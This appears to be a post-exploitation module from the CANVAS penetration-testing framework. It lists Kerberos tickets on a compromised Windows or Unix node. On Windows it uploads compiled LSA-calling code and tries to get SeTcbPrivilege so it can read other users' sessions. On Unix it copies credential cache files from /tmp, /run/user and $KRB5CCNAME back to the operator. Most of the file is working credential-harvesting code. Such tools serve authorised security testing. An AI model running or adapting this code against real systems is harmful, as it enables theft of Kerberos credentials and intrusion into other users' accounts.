#!/usr/bin/env python
##ImmunityHeader v1
###############################################################################
## File       :  kerberos_ticket_list.py
## Description:
##            :
## Created_On :  Fri Feb 20 2015
## Created_By :  X.
##
## (c) Copyright 2015, Immunity, Inc. all rights reserved.
###############################################################################

import os
import sys
import struct
import getopt
import datetime
import time
import random

if "." not in sys.path:
    sys.path.append(".")

from localNode import localNode
from engine.config import canvas_root_directory
from ExploitTypes.localcommand import LocalCommand
from win32MosdefShellServer import NameUserPrincipal

# Kerberos stuff
from libs.kerberos.filetimes import filetime_to_dt, dt_to_filetime, utc
import libs.kerberos.ccache as cc

NAME                            = "Kerberos Ticket Listing"
DESCRIPTION                     = "List all the (potentially) available kerberos tickets on a given node"

DOCUMENTATION                   = {}
DOCUMENTATION["Notes"]          = """
This module aims at emulating the well known klist command on Linux/Windows.
If the current privileges allow it, you will be able to retrieve information
related to the other users of the system.

Note: On Windows target, this module will only be able to work fully with SYSTEM
privileges. If you have Administrator privileges, you might want to migrate to
LSASS.exe (see module mosdefmigrate).

Caveats:
    1. Current version does not support 64 bits callbacks on Windows
    2. On Windows however, being able to list the tickets associated to your logon
    session doesn't necessarily means that you will be able to export usable tickets.
"""


VERSION             = "1.1"
PROPERTY            = {}
PROPERTY['TYPE']    = 'Commands'
PROPERTY['SITE']    = 'Local'
PROPERTY['ARCH']    = [ ['Windows'], ["Linux"] ]
PROPERTY['VERSION'] = [ 'All' ]


class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        randint                = random.randint(0, 5000)
        self.result            = ""
        self.name              = NAME
        self.lp64              = False
        self.debug_tmp         = False
        self.local_path        = os.path.join(os.path.dirname(__file__), "tmp")
        self.unix_ccache_file = os.path.join(self.local_path, 'ccache_%4.4d' % randint)
        if not os.path.exists(self.local_path):
            os.makedirs(self.local_path)
        return

    ###
    # Display the extracted tickets!
    ###

    def display_tickets(self, tickets, target, default_principal=None):
        nbr_tickets = len(tickets)
        log = 'Module results:\n'
        log += '\nCached Ticket(s) found on node (%s): (%d)\n\n' % (target, nbr_tickets)
        for t in tickets:
            log += '\tDefault Principal: %s\n' % ( default_principal if default_principal else "???" )
            log += '\tServer: %s\n' % t['service']
            log += '\t\tTicketFlags: %x [ ' % t['ticketflags']
            if t['ticketflags'] & 0x40000000:
                log += 'FORWARDABLE:Yes, '
            else:
                log += 'FORWARDABLE:No, '
            if t['ticketflags'] & 0x00800000:
                log += 'RENEWABLE:Yes ]'
            else:
                log += 'RENEWABLE:No ]'
            log += '\n'
            log += '\t\tStart Time: %s\n' % t['StartTime']
            log += '\t\tEnd Time: %s\n' % t['EndTime']
            log += '\t\tRenew Time: %s\n\n' % t['RenewTime']
        self.log_info(log)

    ###
    # Windows specific API.
    ###

    def makecode_win32(self):
        # Remote imports may need to become local imports
        imports = """
            // remote
            #import "remote", "secur32.dll|LsaLookupAuthenticationPackage" as "LsaLookupAuthenticationPackage"
            #import "remote", "secur32.dll|LsaCallAuthenticationPackage" as "LsaCallAuthenticationPackage"
            #import "remote", "secur32.dll|LsaConnectUntrusted" as "LsaConnectUntrusted"
            #import "remote", "secur32.dll|LsaFreeReturnBuffer" as "LsaFreeReturnBuffer"
            #import "remote", "secur32.dll|LsaDeregisterLogonProcess" as "LsaDeregisterLogonProcess"
        """

        if self.lp64:
            imports = imports.replace("remote", "local")

        # Other local imports
        imports += """
            // local
            #import "local", "strlen" as "strlen"
            #import "local", "sendunistring2self" as "sendunistring2self"
            #import "local", "senddata2self" as "senddata2self"
            #import "local", "sendint" as "sendint"
            #import "local", "debug" as "debug"
            #import "local", "memcpy" as "memcpy"
            #import "local", "memset" as "memset"
        """

        if self.lp64:
            imports += """
                #import "local", "sendlonglong"    as "sendlonglong"
            """

        # Imports of user supplied strings/int/stuff
        imports += """
            // user supplied objects
            #import "int", "KERB_QUERY_TKT_CACHE_REQUEST_SIZE" as "KERB_QUERY_TKT_CACHE_REQUEST_SIZE"
            #import "int", "LowPart" as "LowPart"
            #import "int", "HighPart" as "HighPart"
        """

        # Macros
        macros = """
            //constants
            #define NULL 0
            #define ERROR_SUCCESS 0
            #define KerbQueryTicketCacheMessage 1
        """

        # Structures 
        structures = """
            struct UNICODE_STRING {
                unsigned short Length;
                unsigned short MaximumLength;
                PADDING_ARCH
                short          *Buffer;
            };

            struct LSA_STRING {
                unsigned short Length;
                unsigned short MaximumLength;
                PADDING_ARCH
                char           *Buffer;
            };

            struct LUID {
                unsigned int LowPart;
                int          HighPart;
            };

            struct LARGE_INTEGER {
                unsigned int LowPart;
                int          HighPart;
            };

            struct SecHandle {
                unsigned long long dwLower;
                unsigned long long dwUpper;
            };

            // 48 bytes (x86) - 64 bytes (x64)
            struct KERB_TICKET_CACHE_INFO {
                struct UNICODE_STRING ServerName;
                struct UNICODE_STRING RealmName;
                struct LARGE_INTEGER  StartTime;
                struct LARGE_INTEGER  EndTime;
                struct LARGE_INTEGER  RenewTime;
                int                   EncryptionType;
                unsigned int          TicketFlags;
            };

            // 56 bytes (x86) - 72 bytes (x64)
            struct KERB_QUERY_TKT_CACHE_RESPONSE {
                int                           MessageType;
                unsigned int                  CountOfTickets;
                struct KERB_TICKET_CACHE_INFO Tickets[1];
            };

            // 12 bytes (x86), 12 bytes (x64)
            struct KERB_QUERY_TKT_CACHE_REQUEST {
                int MessageType;
                struct LUID LogonId;
            };
            """


        # NOW the code itself
        code_template = """
            void send_cached_ticket(struct KERB_TICKET_CACHE_INFO *ticket)
            {
                struct UNICODE_STRING *pUnicode;
                struct LARGE_INTEGER *Time;

                // Send ServerName
                pUnicode = ticket->ServerName;
                senddata2self(pUnicode->Buffer, pUnicode->Length);

                // Send RealmName
                pUnicode = ticket->RealmName;
                senddata2self(pUnicode->Buffer, pUnicode->Length);

                // Send TicketFlags
                SENDLONG(ticket->TicketFlags);

                // Send StartTime
                Time = ticket->StartTime;
                SENDLONG(Time->HighPart);
                SENDLONG(Time->LowPart);

                // Send EndTime
                Time = ticket->EndTime;
                SENDLONG(Time->HighPart);
                SENDLONG(Time->LowPart);

                // Send RenewTime
                Time = ticket->RenewTime;
                SENDLONG(Time->HighPart);
                SENDLONG(Time->LowPart);

                return;
            }

            // https://msdn.microsoft.com/en-us/library/windows/desktop/aa378110%28v=vs.85%29.aspx // KERB_QUERY_TKT_CACHE_REQUEST
            // https://msdn.microsoft.com/en-us/library/windows/desktop/aa378099(v=vs.85).aspx // KERB_PROTOCOL_MESSAGE_TYPE
            // https://msdn.microsoft.com/en-us/library/windows/desktop/aa378116(v=vs.85).aspx // KERB_QUERY_TKT_CACHE_RESPONSE

            int __LsaCallAuthenticationPackage_List(LONG LsaHandle, ULONG AuthenticationPackage)
            {
                struct KERB_QUERY_TKT_CACHE_RESPONSE *pResponse;
                struct KERB_TICKET_CACHE_INFO *ticket;
                struct KERB_QUERY_TKT_CACHE_REQUEST Request;
                ULONG Length;
                LONG ProtocolStatus;
                LONG ntstatus;
                ULONG i;
                int CountOfTickets;
                struct LUID *L;

                pResponse = NULL;
                ticket = NULL;

                Request.MessageType = KerbQueryTicketCacheMessage;
                L = &Request.LogonId;
                L->LowPart = LowPart;
                L->HighPart = HighPart;

                ntstatus = LsaCallAuthenticationPackage(
                    LsaHandle,
                    AuthenticationPackage,
                    &Request,
                    KERB_QUERY_TKT_CACHE_REQUEST_SIZE,
                    &pResponse,
                    &Length,
                    &ProtocolStatus);

                if (ntstatus < 0) {
                    sendint(-3);
                    SENDLONG(ntstatus);
                    if (pResponse)
                        LsaFreeReturnBuffer(pResponse);
                    return 0;
                }

                if(ProtocolStatus < 0) {
                    sendint(-4);
                    SENDLONG(ProtocolStatus);
                    if (pResponse)
                        LsaFreeReturnBuffer(pResponse);
                    return 0;
                }

                // If we dont have an error, we need
                // to send back the number of tickets

                CountOfTickets = pResponse->CountOfTickets;
                sendint(CountOfTickets);

                if(pResponse->CountOfTickets == 0) {
                    if (pResponse)
                        LsaFreeReturnBuffer(pResponse);
                    return 0;
                }

                i=0;
                ticket = pResponse->Tickets;

                // Now we need to send all the tickets
                while( i < CountOfTickets )
                {
                    SENDLONG(ticket); // ptr
                    send_cached_ticket(ticket); // *ptr
                    ticket = ticket + 1;
                    i = i + 1;
                }

                if (pResponse)
                    LsaFreeReturnBuffer(pResponse);
                return 1;
            }

            int __LsaLookupAuthenticationPackage(LONG *LsaHandle, ULONG *AuthenticationPackage)
            {
                LONG status;
                struct LSA_STRING PackageName;

                status = LsaConnectUntrusted(LsaHandle);
                if ( status < 0 ) {
                    sendint(-1);
                    SENDLONG(status);
                    return 0;
                }

                PackageName.Buffer = "Kerberos";
                PackageName.Length = 8;
                PackageName.MaximumLength = 9;

                status = LsaLookupAuthenticationPackage(
                    *LsaHandle,
                    &PackageName,
                    AuthenticationPackage);

                if ( status < 0 ) {
                    sendint(-2);
                    SENDLONG(status);
                    return 0;
                }

                sendint(1);
                return 1;
            }

            void main(){

                LONG ret;
                LONG LsaHandle;
                ULONG AuthenticationPackage;

                ret = __LsaLookupAuthenticationPackage(&LsaHandle, &AuthenticationPackage);
                // If the function returned an error there is nothing we can do.
                if(ret == 0) {
                    return;
                }

                __LsaCallAuthenticationPackage_List(LsaHandle, AuthenticationPackage);

                // Necessary to avoid rogue handles.
                if (LsaHandle)
                    LsaDeregisterLogonProcess(LsaHandle);

                return;
            }
        """

        if self.lp64:
            code_template = code_template.replace("ULONG", "unsigned long long")
            code_template = code_template.replace("SENDLONG", "sendlonglong")
            code_template = code_template.replace("LONG", "long long")
            structures    = structures.replace('PADDING_ARCH', 'unsigned int __paddingx64;')
        else:
            code_template = code_template.replace("ULONG", "unsigned long")
            code_template = code_template.replace("SENDLONG", "sendint")
            code_template = code_template.replace("LONG", "long")
            structures    = structures.replace('PADDING_ARCH', '')
        code = imports + macros + structures + code_template
        return code

    def readLONG(self, shell, signed=False):
        if self.lp64:
            return shell.readlonglong(signed)
        else:
            return shell.readint(signed)

    def readFileTime(self, shell):
        h = self.readLONG(shell)
        l = self.readLONG(shell)
        h = h & 0xffffffff
        l = l & 0xffffffff
        return (h<<32)|l

    def do_recv_ticket_windows(self,shell):
        ticket = {}
        ptr = self.readLONG(shell)
        servername = shell.readblock().decode('utf-16le')
        realname = shell.readblock().decode('utf-16le')
        flags = self.readLONG(shell)
        starttime = self.readFileTime(shell)
        endtime = self.readFileTime(shell)
        renewtime = self.readFileTime(shell)
        ticket['service'] = "%s@%s" % (servername,realname)
        ticket['ticketflags'] = flags
        ticket['StartTime'] = filetime_to_dt(starttime)
        ticket['EndTime'] = filetime_to_dt(endtime)
        ticket['RenewTime'] = filetime_to_dt(renewtime)
        return ticket

    def do_exploit_windows(self, node, luid):

        shell = node.shell

        lvars = {}
        lvars['LowPart'] = luid[0]
        lvars['HighPart'] = luid[1]
        if self.lp64:
            lvars['KERB_QUERY_TKT_CACHE_REQUEST_SIZE'] = 20
        else:
            lvars['KERB_QUERY_TKT_CACHE_REQUEST_SIZE'] = 12

        self.log_info('Preparing the C code')
        code = self.makecode_win32()
        shell.clearfunctioncache()
        try:
            self.log_info('Compiling the code')
            request = shell.compile(code, lvars)
        except Exception as e:
            self.log_error(str(e))
            return None

        self.log_info('Uploading the code...')
        shell.sendrequest(request)

        # __LsaLookupAuthenticationPackage
        ret1 = shell.readint(signed=True)
        if ret1 == -1:
            ntstatus = self.readLONG(shell)
            self.log_error('LsaConnectUntrusted() failed with ntstatus %x' % ntstatus)
            self.log_info('Unlocking the callback')
            shell.leave()
            return None
        if ret1 == -2:
            ntstatus = self.readLONG(shell)
            self.log_error('LsaLookupAuthenticationPackage() failed with ntstatus %x' % ntstatus)
            self.log_info('Unlocking the callback')
            shell.leave()
            return None

        self.log_info('LsaLookupAuthenticationPackage() called successfully')

        # __LsaCallAuthenticationPackage_List
        ret2 = shell.readint(signed=True)
        if ret2 == -3:
            ntstatus = self.readLONG(shell)
            self.log_error('LsaCallAuthenticationPackage() failed with ntstatus %x' % ntstatus)
            self.log_info('Unlocking the callback')
            shell.leave()
            return None
        if ret2 == -4:
            protocol_status = self.readLONG(shell)
            self.log_error('LsaCallAuthenticationPackage() failed with ntstatus = 0 and protocol_status = %x' % protocol_status)
            self.log_info('Unlocking the callback')
            shell.leave()
            return None

        self.log_info('LsaCallAuthenticationPackage() called successfully')
        nbr_tickets = ret2 # needs to be an int, not a long
        if not nbr_tickets:
            self.log_info('No tickets available currently!')
            self.log_info('Unlocking the callback')
            shell.leave()
            return None

        tickets = []
        for i in xrange(nbr_tickets):
            tickets.append(self.do_recv_ticket_windows(shell))
        self.log_info('Leaving')
        shell.leave()
        return tickets

    ###
    # UNIX specific API
    ###

    def extract_client_principal(self, unix_ccache_file):
        cc1 = cc.CCache()
        cc1.open(unix_ccache_file, new=0)
        return cc1.get_primary_principal()

    def extract_unix_ticket_meta(self, unix_ccache_file):
        tickets = []
        try:
            cc1 = cc.CCache()
            cc1.open(unix_ccache_file, new=0)
            creds = cc1.get_credentials()
            for cred in creds:
                # We do not include in the display the configuration stored in
                # the ccache file.
                if cred.is_config_credential():
                    continue
                ticket = {}
                service = cred.get_service_principal()
                client = cred.get_client_principal()
                flags = cred.get_flags()
                times = cred.get_times()
                ticket['service'] = "%s@%s" % (service[0],service[2])
                ticket['ticketflags'] = flags
                if times[0]:
                    ticket['StartTime'] = time.ctime(times[0])
                else:
                    ticket['StartTime'] = '(empty)'
                if times[2]:
                    ticket['EndTime'] = time.ctime(times[2])
                else:
                    ticket['EndTime'] = '(empty)'
                if times[3]:
                    ticket['RenewTime'] = time.ctime(times[3])
                else:
                    ticket['RenewTime'] = '(empty)'
                tickets.append(ticket)
        except Exception as e:
            self.log_error(str(e))
        return tickets

    def makecode_unix(self):
        code = """
            // remote
            #import "REMOTE", "getenv" as "getenv"

            // local
            #import "local", "sendint" as "sendint"
            #import "local", "sendstring" as "sendstring"

            void main(){
                char *p;

                p = getenv("KRB5CCNAME");
                if(p) {
                    sendint(1);
                    sendstring(p);
                    return;
                }
                sendint(0);
                return;
            }
        """

        if self.lp64:
            code = code.replace("REMOTE", "local")
        else:
            code = code.replace("REMOTE", "remote")
        return code

    def do_fetch_ENV_ccache(self, node):

        shell = node.shell
        tickets = []
        self.log_info('Preparing the Unix C code to fetch $KRB5CCNAME')
        code = self.makecode_unix()
        shell.clearfunctioncache()
        try:
            self.log_info('Compiling the code')
            request = shell.compile(code, {})
        except Exception as e:
            self.log_error(str(e))
            return tickets

        self.log_info('Uploading the code...')
        shell.sendrequest(request)

        # So was the payload successful?
        res = shell.readint()
        if not res:
            self.log_info("$KRB5CCNAME is not set in this context")
            self.log_info('Unlocking the callback')
            shell.leave()
            return tickets

        fname = shell.readstring()
        self.log_info("$KRB5CCNAME is set to %s" % fname)
        self.log_info('Unlocking the callback')
        shell.leave()

        ret, stat = shell.stat(fname)
        if ret:
            self.log_error('%s does not exist...' % fname)
            return tickets

        file_size = stat['st_size']
        fd = shell.open(fname, node.shell.libc.getdefine('O_RDONLY'))
        if fd < -1:
            self.log_error('Found potential credentials in %s but we can\'t read them.' % fname)
            return tickets

        ret, ccache_content = shell.read(fd, file_size)
        shell.close(fd)
        if not ret or not ccache_content:
            return tickets

        self.log_info('Found potential credentials in %s' % fname)
        tickets.append((shell.getuid(), ccache_content))
        return tickets

    # Handles FEDORA
    def do_fetch_FEDORA_ccache(self, node, uid=0):

        shell = node.shell
        tickets = []

        # First of all, let's get the directory listing
        file_list = shell.dodir("/run/user/")
        if not file_list:
            return tickets

        # For each file we try to extract the credentials, no matter what.
        # If we are lucky (EUID==0 or privileges problem) we may fetch some.
        for fname,fstat in file_list:
            if fname != '.' and fname != '..':

                uid = fname
                if not uid.isdigit():
                    continue

                # OK does the file exist and can we read it?
                index_file = "/run/user/%s/krb5cc/primary" % fname
                ret, stat = shell.stat(index_file)
                if ret:
                    continue

                file_size = stat['st_size']
                fd = shell.open(index_file, node.shell.libc.getdefine('O_RDONLY'))
                if fd < -1:
                    continue

                ret, ccache_file = shell.read(fd, file_size)
                shell.close(fd)
                if not ret or not ccache_file:
                    continue

                ccache_file = '/run/user/%s/krb5cc/%s' % (fname, ccache_file.strip())
                ret, stat = shell.stat(ccache_file)
                if ret:
                    continue

                file_size = stat['st_size']
                fd = shell.open(ccache_file, node.shell.libc.getdefine('O_RDONLY'))
                if fd < -1:
                    self.log_error('Found potential credentials in %s but we can\'t read them.' % ccache_file)
                    continue

                ret, ccache_content = shell.read(fd, file_size)
                shell.close(fd)
                if not ret or not ccache_content:
                    continue

                self.nlog('Found potential credentials in %s' % ccache_file)
                tickets.append((uid, ccache_content))

        return tickets

    # Handles Ubuntu, Debian, FreeBSD, CentOS
    def do_fetch_UBUNTU_ccache(self, node, uid=0):

        shell = node.shell
        tickets = []

        # First of all, let's get the directory listing
        file_list = shell.dodir("/tmp")
        if not file_list:
            return tickets

        # For each file we try to extract the credentials, no matter what.
        # If we are lucky (EUID==0 or privileges problem) we may fetch some.
        for fname,fstat in file_list:
            if fname != '.' and fname != '..' and fname.startswith('krb5cc_'):

                uid = fname[len('krb5cc_'):]

                if not uid.isdigit():
                    continue

                # OK does the file exist and can we read it?
                fname = '/tmp/' + fname
                ret, stat = shell.stat(fname)
                if ret:
                    continue

                file_size = stat['st_size']
                fd = shell.open(fname, node.shell.libc.getdefine('O_RDONLY'))
                if fd < -1:
                    self.log_info('Found potential credentials in %s but we can\'t read them.' % fname)
                    continue

                ret, ccache_content = shell.read(fd, file_size)
                shell.close(fd)
                if not ret or not ccache_content:
                    continue

                self.log_info('Found potential credentials in %s' % fname)
                tickets.append((uid, ccache_content))

        return tickets

    def do_exploit_unix(self, node):

        shell = node.shell
        uname_str = shell.uname()
        if uname_str:
            self.log_info('Attacking %s %s' % (uname_str['sysname'], uname_str['release']))

        # First of all, let's get the uid
        uid = shell.getuid()
        if not uid:
            self.log_info('Node is running under privileged process (UID=%d)' % uid)
        else:
            self.log_info('Node is running under unprivileged process (UID=%d)' % uid)

        # Of the form [ { 'uid', ccache_file }, ... ]
        tickets = []
        tickets += self.do_fetch_ENV_ccache(node)
        tickets += self.do_fetch_FEDORA_ccache(node, uid)
        tickets += self.do_fetch_UBUNTU_ccache(node, uid)

        from collections import OrderedDict
        tickets2 = list(OrderedDict.fromkeys(tickets))

        # It's time to save the tickets in files.
        for i in xrange(len(tickets2)):
            try:
                uid,data = tickets2[i]
                unix_ccache_file = self.unix_ccache_file + '_%d_uid_%s' % (i,uid)
                self.log_info('Saving temporarily result_%d in %s' % (i,unix_ccache_file))
                f = open(unix_ccache_file, 'wb')
                f.write(data)
                f.close()
                # At this point we have a correct ccache file saved in ./tmp/
                # We may parse it using the CCACHE API.
                tickets_meta_data = self.extract_unix_ticket_meta(unix_ccache_file)
                primary_principal = self.extract_client_principal(unix_ccache_file)
                self.display_tickets(tickets_meta_data, self.get_target_ips_str(node, ", "), primary_principal)
            except Exception as e:
                self.log_error('Unexpected error: %s'%str(e))
                return self.fail()
        return self.success()

    def clean_tmp(self):
        if not self.debug_tmp:
            if os.path.exists(self.unix_ccache_file):
                os.remove(self.unix_ccache_file)

    def success(self):
        self.clean_tmp()
        self.setInfo("%s - done (success: %s)" % (NAME,self.result))
        return 1

    def fail(self):
        self.clean_tmp()
        self.setInfo('%s - done (ERROR)' % NAME)
        return 0

    def getargs(self):
        pass

    def is_64bit_node(self, node):
        if "win32api" in node.capabilities:
            if node.nodetype == "win64Node":
                return True
            else:
                return False
        if "Unix Shell" in node.capabilities:
            if hasattr(node.shell, "LP64"):
                return node.shell.LP64
            else:
                return False
        return False

    def get_target_ips_str(self, node, separator):
        target_ips = node.getallips()
        # 127.0.0.1
        if len(target_ips) == 1:
            return target_ips[0]
        else:
            try:
                target_ips.remove('127.0.0.1')
            except Exception as e:
                pass
            return separator.join(target_ips)

    def run(self):
        self.setInfo("%s (in progress)" % (NAME))
        self.getargs()

        node     = self.argsDict["passednodes"][0]
        _type    = node.nodetype
        nodename = node.getname()

        if isinstance(node, localNode):
            self.log_error('Node of type %s not supported' % _type)
            return self.fail()

        if not node.shell:
            self.log_error("Node doesn't have a shell")
            return self.fail()

        if self.is_64bit_node(node):
            self.lp64 = True

        if "Unix Shell" in node.capabilities:
            return self.do_exploit_unix(node)
        elif "win32api" in node.capabilities:

            # This function may fail, we don't care
            ret, nodeos = node.shell.GetVersionEx()
            if ret:
                minor = nodeos['Minor Version']
                major = nodeos['Major Version']
                self.log_info('Attacking Windows %d.%d' % (major, minor))

            current_principal = node.shell.whoami(name_format=NameUserPrincipal)
            if not current_principal or not '@' in current_principal:
                self.log_info("This host doesn't seem to be part of a domain.")
                domain_fqdn = '<unknown>'
            else:
                domain_fqdn = current_principal.split('@')[1]

            ip_str = self.get_target_ips_str(node, ", ")

            # First of all, we want to retrieve information related to the current
            # session
            info = []
            tickets = self.do_exploit_windows(node, [0,0])
            if tickets:
                info.append((current_principal, tickets))
            # Then let's try to see if we can get the SeTcbPrivilege
            # privilege. If we can, then it means that we are able to impersonate.
            # This gives us the uncanny ability to retrieve informations related to
            # other sessions.
            ret = self.exploitnodes("getpriv", [node], {"privname":"SeTcbPrivilege"})
            if ret[0]:
                self.log_info("Token SeTcbPrivilege was acquired")
                ret, sessions = node.shell.EnumSessions()
                # This should not happen unless there is a major bug in our mosdef code
                if ret or not len(sessions):
                    self.log_error("EnumSessions() failed: spying other sessions is unavailable")
                else:
                    # We can now spy the other sessions
                    for session in sessions:
                        if session['auth_type'] == 'Kerberos':
                            principal = '%s@%s' % (session['username'], domain_fqdn)
                            tickets = self.do_exploit_windows(node, session['logonid'])
                            if tickets:
                                info.append((principal, tickets))
            else:
                self.log_info("Token SeTcbPrivilege could not be acquired")
                self.log_info("If you have administrator privileges, please run the module using SYSTEM privileges")

            # When everything is over, there is nothing left but to print the
            # result of our investigation.
            if not info:
                self.log_info("No tickets found.")
            else:
                for principal, tickets in info:
                    self.display_tickets(tickets, ip_str, principal)
            return self.success()
        else:
            self.log_error("Node of type %s not supported yet" % _type)
            return self.fail()

if __name__=="__main__":
    print "This is an exploit that should be used only from within CANVAS"
